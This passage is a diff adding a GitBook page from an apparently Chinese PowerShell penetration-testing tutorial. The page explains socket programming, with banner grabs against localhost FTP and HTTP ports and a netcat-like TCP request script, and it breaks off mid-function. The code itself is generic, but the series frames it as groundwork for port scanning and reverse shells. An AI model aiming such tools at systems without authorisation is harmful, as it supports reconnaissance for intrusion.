@@ -1,0 +1,883 @@
+
+<!DOCTYPE HTML>
+<html lang="" >
+    <head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>Scoket网络编程 · GitBook</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.3">
+        
+        
+        
+    
+    <link rel="stylesheet" href="gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="gitbook/gitbook-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="gitbook/gitbook-plugin-search/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    <link rel="next" href="5. 端口扫描与服务爆破.html" />
+    
+    
+    <link rel="prev" href="3. 脚本编写与执行.html" />
+    
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="Type to search" />
+</div>
+
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="./">
+            
+                <a href="./">
+            
+                    
+                    前言
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2" data-path="kerberos/README.md">
+            
+                <span>
+            
+                    
+                    基础篇
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.1" data-path="2. 基础.html">
+            
+                <a href="2. 基础.html">
+            
+                    
+                    基础知识
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2" data-path="3. 脚本编写与执行.html">
+            
+                <a href="3. 脚本编写与执行.html">
+            
+                    
+                    脚本编写与执行
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter active" data-level="1.2.3" data-path="4. Scoket网络编程.html">
+            
+                <a href="4. Scoket网络编程.html">
+            
+                    
+                    Scoket网络编程
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4" data-path="5. 端口扫描与服务爆破.html">
+            
+                <a href="5. 端口扫描与服务爆破.html">
+            
+                    
+                    端口扫描与服务爆破
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5" data-path="6. 多线程.html">
+            
+                <a href="6. 多线程.html">
+            
+                    
+                    多线程
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3" data-path="ntlm-pian/README.md">
+            
+                <span>
+            
+                    
+                    进阶篇
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.1" data-path="7. WMI对象操作.html">
+            
+                <a href="7. WMI对象操作.html">
+            
+                    
+                    WMI&dot-net对象操作
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2" data-path="8. Win32API.html">
+            
+                <a href="8. Win32API.html">
+            
+                    
+                    Win32API
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.3" data-path="9. Dll注入&shellcode注入&exe注入.html">
+            
+                <a href="9. Dll注入&shellcode注入&exe注入.html">
+            
+                    
+                    注入操作
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.4" data-path="10. 混淆.html">
+            
+                <a href="10. 混淆.html">
+            
+                    
+                    混淆
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.5" data-path="11. 日志操作.html">
+            
+                <a href="11. 日志操作.html">
+            
+                    
+                    日志操作
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4" data-path="ldap-pian/README.md">
+            
+                <span>
+            
+                    
+                    应用篇
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.1" data-path="12. 实例使用场景.html">
+            
+                <a href="12. 实例使用场景.html">
+            
+                    
+                    实例使用场景
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2" data-path="13. Framework.html">
+            
+                <a href="13. Framework.html">
+            
+                    
+                    Framework
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+            Published with GitBook
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href="." >Scoket网络编程</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <h1 id="powershell4-socket&#x7F51;&#x7EDC;&#x7F16;&#x7A0B;">Powershell(4)-Socket&#x7F51;&#x7EDC;&#x7F16;&#x7A0B;</h1>
+<blockquote>
+<p>&#x8FD9;&#x4E00;&#x5C0F;&#x8282;&#x6211;&#x4EEC;&#x4ECB;&#x7ECD;Powershell&#x4E2D;&#x7684;Socket&#x7F16;&#x7A0B;&#xFF0C;&#x7F51;&#x7EDC;&#x7F16;&#x7A0B;&#x662F;&#x6240;&#x6709;&#x8BED;&#x8A00;&#x4E2D;&#x7ED5;&#x4E0D;&#x5F00;&#x7684;&#x6838;&#x5FC3;&#x70B9;&#xFF0C;&#x4E0B;&#x9762;&#x6211;&#x4EEC;&#x901A;&#x8FC7;&#x5BF9;&#x4EE3;&#x7801;&#x7684;&#x5206;&#x6790;&#x6765;&#x8BA9;&#x5927;&#x5BB6;&#x5BF9;PS&#x4E2D;&#x7684;Socket&#x6709;&#x4E00;&#x4E2A;&#x521D;&#x6B65;&#x7684;&#x4E86;&#x89E3;&#x3002;</p>
+</blockquote>
+<h2 id="scoket-tcp&#x7F16;&#x7A0B;">Scoket-Tcp&#x7F16;&#x7A0B;</h2>
+<p>&#x5F00;&#x59CB;&#x4E4B;&#x524D;&#x6211;&#x4EEC;&#x5148;&#x60F3;&#x60F3;&#x4E3A;&#x4EC0;&#x4E48;&#x8981;&#x5B66;&#x4E60;socket&#x7F16;&#x7A0B;&#xFF0C;&#x90A3;&#x4E48;&#x6700;&#x76F4;&#x89C2;&#x7684;&#x662F;&#x7AEF;&#x53E3;&#x626B;&#x63CF;&#xFF0C;&#x90A3;&#x4E48;&#x8FD8;&#x6709;&#x53EF;&#x80FD;&#x662F;&#x53CD;&#x5F39;shell&#x4E4B;&#x7C7B;&#x7684;&#x5E94;&#x7528;&#x3002;&#x8FDB;&#x884C;Socket&#x7F16;&#x7A0B;&#x53EA;&#x9700;&#x8981;&#x8C03;&#x7528;.Net&#x6846;&#x67B6;&#x5373;&#x53EF;&#xFF0C;&#x8FD9;&#x91CC;&#x5148;&#x4F7F;&#x7528;TCP&#x6765;&#x793A;&#x4F8B;:</p>
+<p>&#x8FD9;&#x91CC;&#x662F;&#x53BB;&#x6253;&#x5F00;&#x4E00;&#x4E2A;TCP&#x8FDE;&#x63A5;&#x5230;&#x672C;&#x5730;&#x7684;21&#x7AEF;&#x53E3;&#xFF0C;&#x5E76;&#x83B7;&#x53D6;21&#x7AEF;&#x53E3;&#x8FD4;&#x56DE;&#x7684;Banner&#x4FE1;&#x606F;&#xFF0C;&#x5176;&#x4E2D;GetOutput&#x51FD;&#x6570;&#x770B;&#x4E0D;&#x4E86;&#x53EF;&#x4EE5;&#x5148;&#x4E0D;&#x770B;,&#x5176;&#x7528;&#x6765;&#x83B7;&#x53D6;stream&#x4E2D;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x4E3B;&#x8981;&#x770B;Main&#x51FD;&#x6570;&#x5185;&#x5BB9;&#xFF1A;</p>
+<pre><code class="lang-powershell">Tcp-Demo.ps1
+<span class="hljs-keyword">function</span> GetOutput 
+{ 
+    <span class="hljs-comment">## &#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x7F13;&#x51B2;&#x533A;&#x83B7;&#x53D6;&#x6570;&#x636E;</span>
+    <span class="hljs-variable">$buffer</span> = <span class="hljs-built_in">new-object</span> System.Byte[] <span class="hljs-number">1024</span> 
+    <span class="hljs-variable">$encoding</span> = <span class="hljs-built_in">new-object</span> System.Text.AsciiEncoding 
+
+    <span class="hljs-variable">$outputBuffer</span> = <span class="hljs-string">&quot;&quot;</span> 
+    <span class="hljs-variable">$findMore</span> = <span class="hljs-literal">$false</span> 
+
+    <span class="hljs-comment">## &#x4ECE;stream&#x8BFB;&#x53D6;&#x6240;&#x6709;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x5199;&#x5230;&#x8F93;&#x51FA;&#x7F13;&#x51B2;&#x533A;</span>
+    <span class="hljs-keyword">do</span>{ 
+        <span class="hljs-built_in">start-sleep</span> -m <span class="hljs-number">1000</span> 
+        <span class="hljs-variable">$findmore</span> = <span class="hljs-literal">$false</span> 
+        <span class="hljs-comment"># &#x8BFB;&#x53D6;Timeout</span>
+        <span class="hljs-variable">$stream</span>.ReadTimeout = <span class="hljs-number">1000</span> 
+
+        <span class="hljs-keyword">do</span>{ 
+            <span class="hljs-keyword">try</span> { 
+                <span class="hljs-variable">$read</span> = <span class="hljs-variable">$stream</span>.Read(<span class="hljs-variable">$buffer</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1024</span>) 
+                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$read</span> <span class="hljs-nomarkup">-gt</span> <span class="hljs-number">0</span>){ 
+                    <span class="hljs-variable">$findmore</span> = <span class="hljs-literal">$true</span> 
+                    <span class="hljs-variable">$outputBuffer</span> += (<span class="hljs-variable">$encoding</span>.GetString(<span class="hljs-variable">$buffer</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$read</span>)) 
+                } 
+            } <span class="hljs-keyword">catch</span> { <span class="hljs-variable">$findMore</span> = <span class="hljs-literal">$false</span>; <span class="hljs-variable">$read</span> = <span class="hljs-number">0</span> } 
+        } <span class="hljs-keyword">while</span>(<span class="hljs-variable">$read</span> <span class="hljs-nomarkup">-gt</span> <span class="hljs-number">0</span>) 
+    } <span class="hljs-keyword">while</span>(<span class="hljs-variable">$findmore</span>) 
+
+    <span class="hljs-variable">$outputBuffer</span> 
+}
+
+<span class="hljs-keyword">function</span> Main{
+    <span class="hljs-comment"># &#x5B9A;&#x4E49;&#x4E3B;&#x673A;&#x548C;&#x7AEF;&#x53E3;</span>
+    <span class="hljs-variable">$remoteHost</span> = <span class="hljs-string">&quot;127.0.0.1&quot;</span>
+    <span class="hljs-variable">$port</span> = <span class="hljs-number">21</span>
+    <span class="hljs-comment"># &#x5B9A;&#x4E49;&#x8FDE;&#x63A5;Host&#x4E0E;Port</span>
+    <span class="hljs-variable">$socket</span> = <span class="hljs-built_in">new-object</span> System.Net.Sockets.TcpClient(<span class="hljs-variable">$remoteHost</span>, <span class="hljs-variable">$port</span>) 
+    <span class="hljs-comment"># &#x8FDB;&#x884C;&#x8FDE;&#x63A5;</span>
+    <span class="hljs-variable">$stream</span> = <span class="hljs-variable">$socket</span>.GetStream()
+    <span class="hljs-comment"># &#x83B7;&#x53D6;Stream</span>
+    <span class="hljs-variable">$writer</span> = <span class="hljs-built_in">new-object</span> System.IO.StreamWriter <span class="hljs-variable">$stream</span> 
+    <span class="hljs-comment"># &#x521B;&#x5EFA;IO&#x5BF9;&#x8C61;</span>
+    <span class="hljs-variable">$SCRIPT:output</span> += GetOutput 
+    <span class="hljs-comment"># &#x58F0;&#x660E;&#x53D8;&#x91CF;</span>
+    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$output</span>){ 
+        <span class="hljs-comment"># &#x8F93;&#x51FA;</span>
+        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$line</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$output</span>.Split(<span class="hljs-string">&quot;`n&quot;</span>)) 
+        {
+            <span class="hljs-built_in">write-host</span> <span class="hljs-variable">$line</span> 
+        }
+        <span class="hljs-variable">$SCRIPT:output</span> = <span class="hljs-string">&quot;&quot;</span> 
+    }
+}
+. Main
+</code></pre>
+<p>&#x6211;&#x4EEC;&#x6765;&#x770B;&#x770B;&#x8F93;&#x51FA;&#x7ED3;&#x679C;&#xFF1A;</p>
+<pre><code class="lang-powershell">PS C:\Users\rootclay\Desktop\powershell&gt; . .\Tcp-Demo.ps1
+<span class="hljs-number">220</span> Microsoft FTP Service
+</code></pre>
+<p>&#x8FD9;&#x6837;&#x5C31;&#x6253;&#x5F00;&#x4E86;21&#x7AEF;&#x53E3;&#x7684;&#x8FDE;&#x63A5;&#xFF0C;&#x5E76;&#x4E14;&#x83B7;&#x53D6;&#x5230;&#x4E86;21&#x7AEF;&#x53E3;&#x7684;banner&#x4FE1;&#x606F;.</p>
+<p>&#x90A3;&#x4E48;&#x6709;&#x8FC7;&#x7AEF;&#x53E3;&#x626B;&#x63CF;&#x7F16;&#x5199;&#x7684;&#x670B;&#x53CB;&#x80AF;&#x5B9A;&#x5DF2;&#x7ECF;&#x770B;&#x5230;&#x4E86;&#xFF0C;&#x8FD9;&#x79CD;&#x65B9;&#x5F0F;&#x662F;&#x76F4;&#x63A5;&#x6253;&#x5F00;&#x8FDE;&#x63A5;&#xFF0C;&#x5E76;&#x4E0D;&#x80FD;&#x83B7;&#x53D6;&#x5230;&#x4E00;&#x4E9B;&#x9700;&#x8981;&#x53D1;&#x5305;&#x624D;&#x80FD;&#x8FD4;&#x56DE;banner&#x7684;&#x7AEF;&#x53E3;&#x4FE1;&#x606F;&#xFF0C;&#x5178;&#x578B;&#x7684;80&#x7AEF;&#x53E3;&#x5C31;&#x662F;&#x5982;&#x6B64;&#xFF0C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x7ED9;80&#x7AEF;&#x53E3;&#x53D1;&#x9001;&#x7279;&#x5B9A;&#x7684;&#x4FE1;&#x606F;&#x624D;&#x80FD;&#x5F97;&#x5230;Response, &#x5F53;&#x7136;&#x8FD8;&#x6709;&#x8BB8;&#x591A;&#x7C7B;&#x4F3C;&#x7684;&#x7AEF;&#x53E3;&#xFF0C;&#x6BD4;&#x5982;3389&#x7AEF;&#x53E3;, &#x4E0B;&#x9762;&#x6211;&#x4EEC;&#x6765;&#x770B;&#x770B;&#x6211;&#x4EEC;&#x5982;&#x4F55;&#x4F7F;&#x7528;powershell&#x5B9E;&#x73B0;&#x8FD9;&#x9879;&#x529F;&#x80FD;.</p>
+<pre><code class="lang-powershell">Tcp-Demo2.ps1
+<span class="hljs-keyword">function</span> GetOutput 
+{ 
+    ... <span class="hljs-comment"># &#x4EE3;&#x7801;&#x548C;&#x4E0A;&#x9762;&#x7684;&#x4E00;&#x6837;</span>
+}
+
+<span class="hljs-keyword">function</span> Main{
+    <span class="hljs-comment"># &#x5B9A;&#x4E49;&#x4E3B;&#x673A;&#x548C;&#x7AEF;&#x53E3;</span>
+    <span class="hljs-variable">$remoteHost</span> = <span class="hljs-string">&quot;127.0.0.1&quot;</span>
+    <span class="hljs-variable">$port</span> = <span class="hljs-number">80</span>
+    <span class="hljs-comment"># &#x5B9A;&#x4E49;&#x8FDE;&#x63A5;Host&#x4E0E;Port</span>
+    <span class="hljs-variable">$socket</span> = <span class="hljs-built_in">new-object</span> System.Net.Sockets.TcpClient(<span class="hljs-variable">$remoteHost</span>, <span class="hljs-variable">$port</span>) 
+    <span class="hljs-comment"># &#x8FDB;&#x884C;&#x8FDE;&#x63A5;</span>
+    <span class="hljs-variable">$stream</span> = <span class="hljs-variable">$socket</span>.GetStream()
+    <span class="hljs-comment"># &#x83B7;&#x53D6;Stream</span>
+    <span class="hljs-variable">$writer</span> = <span class="hljs-built_in">new-object</span> System.IO.StreamWriter <span class="hljs-variable">$stream</span> 
+    <span class="hljs-comment"># &#x521B;&#x5EFA;IO&#x5BF9;&#x8C61;</span>
+    <span class="hljs-variable">$SCRIPT:output</span> += GetOutput 
+    <span class="hljs-comment"># &#x58F0;&#x660E;&#x53D8;&#x91CF;, userInput&#x4E3A;&#x8981;&#x53D1;&#x5305;&#x7684;&#x5185;&#x5BB9;,&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x53D1;&#x9001;&#x4E00;&#x4E2A;GET&#x8BF7;&#x6C42;&#x7ED9;Server</span>
+    <span class="hljs-variable">$userInput</span> = <span class="hljs-string">&quot;GET / HTTP/1.1 `nHost: localhost  `n`n&quot;</span>
+    <span class="hljs-comment"># &#x5B9A;&#x4E49;&#x53D1;&#x5305;&#x5185;&#x5BB9;</span>
+    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$line</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$userInput</span>) 
+        { 
+            <span class="hljs-comment"># &#x53D1;&#x9001;&#x6570;&#x636E;</span>
+            <span class="hljs-variable">$writer</span>.WriteLine(<span class="hljs-variable">$line</span>) 
+            <span class="hljs-variable">$writer</span>.Flush() 
+            <span class="hljs-variable">$SCRIPT:output</span> += GetOutput 
+        } 
+
+    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$output</span>){ 
+        <span class="hljs-comment"># &#x8F93;&#x51FA;</span>
+        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$line</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$output</span>.Split(<span class="hljs-string">&quot;`n&quot;</span>)) 
+        {
+            <span class="hljs-built_in">write-host</span> <span class="hljs-variable">$line</span> 
+        }
+        <span class="hljs-variable">$SCRIPT:output</span> = <span class="hljs-string">&quot;&quot;</span> 
+    }
+}
+. Main
+</code></pre>
+<p>&#x6211;&#x4EEC;&#x6765;&#x770B;&#x770B;&#x8F93;&#x51FA;:</p>
+<pre><code class="lang-powershell">PS C:\Users\rootclay\Desktop\powershell&gt; . .\Tcp-Demo2.ps1
+HTTP/<span class="hljs-number">1.1</span> <span class="hljs-number">200</span> OK
+Content-Type: text/html
+Accept-Ranges: bytes
+ETag: <span class="hljs-string">&quot;5e26ec16b73ad31:0&quot;</span>
+Server: Microsoft-IIS/<span class="hljs-number">7.5</span>
+Content-Length: <span class="hljs-number">689</span>
+
+&lt;!DOCTYPE html PUBLIC <span class="hljs-string">&quot;-//W3C//DTD XHTML 1.0 Strict//EN&quot;</span> <span class="hljs-string">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&quot;</span>&gt;
+&lt;html xmlns=<span class="hljs-string">&quot;http://www.w3.org/1999/xhtml&quot;</span>&gt;
+&lt;head&gt;
+&lt;meta http-equiv=<span class="hljs-string">&quot;Content-Type&quot;</span> content=<span class="hljs-string">&quot;text/html; charset=iso-8859-1&quot;</span> /&gt;
+&lt;title&gt;IIS7&lt;/title&gt;
+&lt;style type=<span class="hljs-string">&quot;text/css&quot;</span>&gt;
+&lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+...
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>&#x6211;&#x4EEC;&#x4E0B;&#x9762;&#x5BF9;&#x8FD9;&#x9879;&#x529F;&#x80FD;&#x8FDB;&#x884C;&#x4E00;&#x4E2A;&#x6574;&#x5408;&#xFF1A;</p>
+<p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x53D1;&#x5305;&#x7ED9;&#x4E00;&#x4E2A;&#x7AEF;&#x53E3;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x8FDE;&#x63A5;&#x4E00;&#x4E2A;&#x7AEF;&#x53E3;&#xFF0C;&#x8FD9;&#x91CC;&#x5DF2;&#x7ECF;&#x5B9E;&#x73B0;TCP&#xFF0C;http&#xFF0C;https&#x4E09;&#x79CD;&#x5E38;&#x89C1;&#x534F;&#x8BAE;&#x7684;&#x8BBF;&#x95EE;</p>
+<pre><code class="lang-powershell"><span class="hljs-comment">########################################</span>
+<span class="hljs-comment">## Tcp-Request.ps1 </span>
+<span class="hljs-comment">## </span>
+<span class="hljs-comment">## Example1: </span>
+<span class="hljs-comment">## </span>
+<span class="hljs-comment">## $http = @&quot; </span>
+<span class="hljs-comment">## GET / HTTP/1.1 </span>
+<span class="hljs-comment">## Host:127.0.0.1 </span>
+<span class="hljs-comment">## `n`n </span>
+<span class="hljs-comment">## &quot;@ </span>
+<span class="hljs-comment">## </span>
+<span class="hljs-comment">## `n &#x5728;Powershell&#x4E2D;&#x4EE3;&#x8868;&#x6362;&#x884C;&#x7B26;</span>
+<span class="hljs-comment">## $http | .\Tcp-Request localhost  80 </span>
+<span class="hljs-comment">## </span>
+<span class="hljs-comment">## Example2: </span>
+<span class="hljs-comment">## .\Tcp-Request localhost 80  </span>
+<span class="hljs-comment">######################################## </span>
+
+<span class="hljs-comment">## &#x7BA1;&#x7406;&#x53C2;&#x6570;&#x8F93;&#x5165;param()&#x6570;&#x7EC4;</span>
+<span class="hljs-keyword">param</span>( 
+        [string] <span class="hljs-variable">$remoteHost</span> = <span class="hljs-string">&quot;localhost&quot;</span>, 
+        [int] <span class="hljs-variable">$port</span> = <span class="hljs-number">80</span>, 
+        [switch] <span class="hljs-variable">$UseSSL</span>, 
+        [string] <span class="hljs-variable">$inputObject</span>, 
+        [int] <span class="hljs-variable">$commandDelay</span> = <span class="hljs-number">100</span> 
+     ) 
+
+[string] <span class="hljs-variable">$output</span> = <span class="hljs-string">&quot;&quot;</span> 
+
+<span class="hljs-comment">## &#x83B7;&#x53D6;&#x7528;&#x6237;&#x8F93;&#x5165;&#x6A21;&#x5F0F;</span>
+<span class="hljs-variable">$currentInput</span> = <span class="hljs-variable">$inputObject</span> 
+<span class="hljs-keyword">if</span>(<span class="hljs-nomarkup">-not</span> <span class="hljs-variable">$currentInput</span>) 
+{ 
+    <span class="hljs-variable">$SCRIPT:currentInput</span> = @(<span class="hljs-variable">$input</span>) 
+} 
+<span class="hljs-comment"># &#x811A;&#x672C;&#x6A21;&#x5F0F;&#x5F00;&#x5173;, &#x5982;&#x679C;&#x811A;&#x672C;&#x80FD;&#x8BFB;&#x53D6;&#x5230;&#x8F93;&#x5165;, &#x4F7F;&#x7528;&#x53D1;&#x5305;&#x6A21;&#x5F0F;, &#x5982;&#x679C;&#x6CA1;&#x6709;&#x8F93;&#x5165;&#x4F7F;&#x7528;TCP&#x76F4;&#x8FDE;&#x6A21;&#x5F0F;</span>
+<span class="hljs-variable">$scriptedMode</span> = [bool] <span class="hljs-variable">$currentInput</span> 
+
+<span class="hljs-keyword">function</span> Main
+{ 
+    <span class="hljs-comment">## &#x6253;&#x5F00;socket&#x8FDE;&#x63A5;&#x8FDC;&#x7A0B;&#x673A;&#x5668;&#x548C;&#x7AEF;&#x53E3;</span>
+    <span class="hljs-keyword">if</span>(<span class="hljs-nomarkup">-not</span> <span class="hljs-variable">$scriptedMode</span>) 
+    { 
+        <span class="hljs-built_in">write-host</span> <span class="hljs-string">&quot;Connecting to <span class="hljs-variable">$remoteHost</span> on port <span class="hljs-variable">$port</span>&quot;</span> 
+    } 
+    <span class="hljs-comment">## &#x5F02;&#x5E38;&#x8FFD;&#x8E2A;</span>
+    <span class="hljs-keyword">trap</span> { <span class="hljs-built_in">Write-Error</span> <span class="hljs-string">&quot;Could not connect to remote computer: <span class="hljs-variable">$_</span>&quot;</span>; <span class="hljs-keyword">exit</span> } 
+    <span class="hljs-variable">$socket</span> = <span class="hljs-built_in">new-object</span> System.Net.Sockets.TcpClient(<span class="hljs-variable">$remoteHost</span>, <span class="hljs-variable">$port</span>) 
+
+    <span class="hljs-keyword">if</span>(<span class="hljs-nomarkup">-not</span> <span class="hljs-variable">$scriptedMode</span>) 
+    { 
+        <span class="hljs-built_in">write-host</span> <span class="hljs-string">&quot;Connected. Press ^D(Control + D) followed by [ENTER] to exit.`n&quot;</span> 
+    } 
+
+    <span class="hljs-variable">$stream</span> = <span class="hljs-variable">$socket</span>.GetStream() 
+
+    <span class="hljs-comment">## &#x5982;&#x679C;&#x6709;SSl&#x4F7F;&#x7528;SSLStream&#x83B7;&#x53D6;Stream</span>
+    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$UseSSL</span>) 
+    { 
+        <span class="hljs-variable">$sslStream</span> = <span class="hljs-built_in">New-Object</span> System.Net.Security.SslStream <span class="hljs-variable">$stream</span>,<span class="hljs-literal">$false</span> 
+        <span class="hljs-variable">$sslStream</span>.AuthenticateAsClient(<span class="hljs-variable">$remoteHost</span>) 
+        <span class="hljs-variable">$stream</span> = <span class="hljs-variable">$sslStream</span> 
+    } 
+
+    <span class="hljs-variable">$writer</span> = <span class="hljs-built_in">new-object</span> System.IO.StreamWriter <span class="hljs-variable">$stream</span> 
+
+    <span class="hljs-keyword">while</span>(<span class="hljs-literal">$true</span>) 
+    { 
+        <span class="hljs-comment">## &#x83B7;&#x53D6;&#x5F97;&#x5230;&#x7684;Response&#x7ED3;&#x679C;</span>
+        <span class="hljs-variable">$SCRIPT:output</span> += GetOutput 
+
+
+        <span class="hljs-comment">## &#x5982;&#x679C;&#x6211;&#x4EEC;&#x4F7F;&#x7528;&#x4E86;&#x7BA1;&#x9053;&#x8F93;&#x5165;&#x7684;&#x6A21;&#x5F0F;&#xFF0C;&#x6211;&#x4EEC;&#x53D1;&#x9001;&#x6211;&#x4EEC;&#x7684;&#x547D;&#x4EE4;&#xFF0C;&#x518D;&#x63A5;&#x53D7;&#x8F93;&#x51FA;&#xFF0C;&#x5E76;&#x9000;&#x51FA;</span>
+        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$scriptedMode</span>) 
+        { 
+            <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$line</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$currentInput</span>) 
+            { 
+                <span class="hljs-variable">$writer</span>.WriteLine(<span class="hljs-variable">$line</span>) 
+                <span class="hljs-variable">$writer</span>.Flush() 
+                <span class="hljs-built_in">Start-Sleep</span> -m <span class="hljs-variable">$commandDelay</span> 
+                <span class="hljs-variable">$SCRIPT:output</span> += GetOutput 
+            } 
+
+            <span class="hljs-keyword">break</span> 
+        } 
+        <span class="hljs-comment">## &#x5982;&#x679C;&#x6CA1;&#x6709;&#x4F7F;&#x7528;&#x4E8B;&#x5148;&#x7BA1;&#x9053;&#x8F93;&#x5165;&#x7684;&#x6A21;&#x5F0F;&#x76F4;&#x63A5;&#x8BFB;&#x53D6;TCP&#x56DE;&#x5305;</span>
+        <span class="hljs-keyword">else</span> 
+        { 
+            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$output</span>)  
+            { 
+                <span class="hljs-comment"># &#x9010;&#x884C;&#x8F93;&#x51FA;</span>
+                <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$line</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$output</span>.Split(<span class="hljs-string">&quot;`n&quot;</span>)) 
+                { 
+                    <span class="hljs-built_in">write-host</span> <span class="hljs-variable">$line</span> 
+                } 
+                <span class="hljs-variable">$SCRIPT:output</span> = <span class="hljs-string">&quot;&quot;</span> 
+            } 
+
+            <span class="hljs-comment">## &#x83B7;&#x53D6;&#x7528;&#x6237;&#x7684;&#x8F93;&#x5165;,&#x5982;&#x679C;&#x8BFB;&#x53D6;&#x5230;^D&#x5C31;&#x9000;&#x51FA; </span>
+            <span class="hljs-variable">$command</span> = <span class="hljs-built_in">read-host</span> 
+            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$command</span> <span class="hljs-nomarkup">-eq</span> ([char] <span class="hljs-number">4</span>)) { <span class="hljs-keyword">break</span>; } 
+
+            <span class="hljs-variable">$writer</span>.WriteLine(<span class="hljs-variable">$command</span>) 
+            <span class="hljs-variable">$writer</span>.Flush() 
+        } 
+    } 
+
+    <span class="hljs-comment">## Close the streams </span>
+    <span class="hljs-variable">$writer</span>.Close() 
+    <span class="hljs-variable">$stream</span>.Close() 
+
+    <span class="hljs-comment">## &#x5982;&#x679C;&#x6211;&#x4EEC;&#x4F7F;&#x7528;&#x4E86;&#x7BA1;&#x9053;&#x8F93;&#x5165;&#x7684;&#x6A21;&#x5F0F;,&#x8FD9;&#x91CC;&#x8F93;&#x51FA;&#x521A;&#x624D;&#x8BFB;&#x53D6;&#x5230;&#x670D;&#x52A1;&#x5668;&#x8FD4;&#x56DE;&#x7684;&#x6570;&#x636E;</span>
+    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$scriptedMode</span>) 
+    { 
+        <span class="hljs-variable">$output</span> 
+    } 
+} 
+
+<span class="hljs-comment">## &#x83B7;&#x53D6;&#x8FDC;&#x7A0B;&#x670D;&#x52A1;&#x5668;&#x7684;&#x8FD4;&#x56DE;&#x6570;&#x636E;</span>
+<span class="hljs-keyword">function</span> GetOutput 
+{ 
